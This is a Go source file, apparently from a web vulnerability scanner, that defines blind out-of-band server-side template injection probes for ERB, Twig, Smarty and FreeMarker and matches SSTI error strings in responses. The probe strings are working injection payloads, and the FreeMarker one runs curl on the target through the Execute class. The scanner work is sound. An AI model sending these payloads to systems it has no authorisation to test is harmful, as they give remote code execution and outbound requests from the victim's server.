package lua_engine

import (
	"bytes"
)

// sstiOOBPayload describes one engine-specific blind probe: the template
// source to send (with {{URL}} substituted at probe time) and the
// engine label the finding will quote on a hit. Each entry targets a
// distinct template engine, so a Run that sends every payload against
// one sink still attributes a hit to the right engine via the
// registration's Extra metadata.
type sstiOOBPayload struct {
	Engine string
	// Tmpl carries a {{URL}} placeholder replaced with the canary URL
	// before sending. Kept as a string template (not Go's text/template)
	// so the payload source is grep-able verbatim.
	Tmpl string
}

// sstiOOBPayloads is the engine-by-engine list of HTTP-issuing template
// primitives. Each one fires only when the matching engine is rendering
// the sink AND its security configuration permits the primitive
// (allow_url_include on for Twig/Smarty, Execute class in scope for
// FreeMarker, open-uri loadable for ERB). The list is small on purpose:
// a permissive engine in this set is reliably exploitable; padding it
// with marginal-confidence payloads would dilute the signal.
var sstiOOBPayloads = []sstiOOBPayload{
	// Ruby ERB. open-uri is bundled with stdlib so the require almost
	// always succeeds when ERB itself is the engine.
	{Engine: "erb", Tmpl: `<%= require 'open-uri'; open('{{URL}}').read %>`},
	// PHP Twig. include() across a URL needs allow_url_include=On at
	// the PHP level AND a non-sandboxed Twig environment - both are
	// common in legacy apps.
	{Engine: "twig", Tmpl: `{{ include('{{URL}}') }}`},
	// PHP Smarty. Same allow_url_include precondition.
	{Engine: "smarty", Tmpl: `{include file='{{URL}}'}`},
	// Java FreeMarker. The Execute class is a built-in utility; on
	// stacks that left it in scope, a shell-out to curl issues the
	// fetch the listener correlates against.
	{Engine: "freemarker", Tmpl: `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl {{URL}}")}`},
}

// locDescriptor returns the human-facing role for a Loc - "parameter" for
// query/form/path/json inputs, "header" for headers, etc. - so the finding
// title reads "in query parameter" rather than "in query query".
func locDescriptor(l Loc) string {
	switch l {
	case LocHeader:
		return "header"
	case LocCookie:
		return "cookie"
	default:
		return "parameter"
	}
}

// matchSSTIErrors returns every SSTIErrorPatterns entry that appears in body.
// Body is lowercased once per call so substring scans are case-insensitive.
func matchSSTIErrors(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	lower := bytes.ToLower(body)
	var hits []string
	for _, pat := range SSTIErrorPatterns() {
		if bytes.Contains(lower, []byte(pat)) {
			hits = append(hits, pat)
		}
	}
	return hits
}
